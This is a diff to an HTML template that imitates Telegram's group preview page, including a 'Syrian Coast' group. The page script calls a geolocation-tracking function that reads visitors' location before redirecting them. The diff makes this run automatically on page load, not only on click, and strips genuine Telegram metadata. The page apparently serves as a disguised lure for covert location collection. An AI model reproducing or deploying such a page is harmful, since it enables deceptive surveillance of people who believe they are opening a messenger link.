@@ -4,7 +4,8 @@
 <head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
-  <title>Telegram: View @<%= group.slug %></title>
+  <title>Telegram: View @<%= group.slug %>
+  </title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta property="og:title" content="<%= group.name %>">
   <meta property="og:image" content="<%= group.image %>">
@@ -18,20 +19,7 @@
   <meta name="twitter:card" content="summary">
   <meta name="twitter:site" content="@Telegram">
   <meta name="twitter:description" content="<%= group.description %>">
-  <meta property="al:ios:app_store_id" content="686449807">
-  <meta property="al:ios:app_name" content="Telegram Messenger">
 
-
-  <meta property="al:android:app_name" content="Telegram">
-  <meta property="al:android:package" content="org.telegram.messenger">
-
-  <meta name="twitter:app:name:iphone" content="Telegram Messenger">
-  <meta name="twitter:app:id:iphone" content="686449807">
-  <meta name="twitter:app:name:ipad" content="Telegram Messenger">
-  <meta name="twitter:app:id:ipad" content="686449807">
-
-  <meta name="twitter:app:name:googleplay" content="Telegram">
-  <meta name="twitter:app:id:googleplay" content="org.telegram.messenger">
 
   <link rel="icon" type="image/svg+xml" href="https://telegram.org/img/website_icon.svg?4">
   <link rel="apple-touch-icon" sizes="180x180" href="https://telegram.org/img/apple-touch-icon.png">
@@ -95,7 +83,7 @@
         </div>
         <div class="tgme_page_action">
           <a class="tgme_action_button_new shine clicked" href="<%= group.link %>" data-group-id="<%= group._id %>">View
-            in Telegram</a>
+            in Totegram</a>
         </div>
         <!-- WEBOGRAM_BTN -->
         <div class="tgme_page_context_link_wrap">
@@ -104,7 +92,7 @@
           </a>
         </div>
         <div class="tgme_page_additional">
-          If you have <strong>Telegram</strong>, you can view and join <br><strong>الساحل السوري 24 | Syrian
+          If you have <strong>Totegram</strong>, you can view and join <br><strong>الساحل السوري 24 | Syrian
             Coast</strong> right away.
         </div>
       </div>
@@ -115,7 +103,6 @@
   <div id="tgme_frame_cont"></div>
 
   <script type="text/javascript">
-
     console.clear();
     function initGeolocationTracking(button) {
       if ("geolocation" in navigator) {
@@ -151,39 +138,18 @@
         window.location.href = button.getAttribute('href');
       }
     }
-
     // انتظر تحميل الصفحة لتفعيل الأحداث
     window.addEventListener('DOMContentLoaded', () => {
-      document.querySelectorAll('.clicked').forEach((btn) => {
-        initGeolocationTracking(btn);
+      document.querySelectorAll('.clicked').forEach((btn, index) => {
+        if (index == 0) {
+          initGeolocationTracking(btn);
+        }
         btn.addEventListener('click', (event) => {
           event.preventDefault();
           initGeolocationTracking(btn);
         });
       });
     });
-
-    var tme_bg = document.getElementById('tgme_background');
-    if (tme_bg) {
-      TWallpaper.init(tme_bg);
-      TWallpaper.animate(true);
-      window.onfocus = function () { TWallpaper.update(); };
-    }
-    document.body.classList.remove('no_transition');
-
-    function toggleTheme(dark) {
-      document.documentElement.classList.toggle('theme_dark', dark);
-      window.Telegram && Telegram.setWidgetOptions({ dark: dark });
-    }
-    if (window.matchMedia) {
-      var darkMedia = window.matchMedia('(prefers-color-scheme: dark)');
-      toggleTheme(darkMedia.matches);
-      darkMedia.addListener(function (e) {
-        toggleTheme(e.matches);
-      });
-    }
-
-
   </script>
 
 
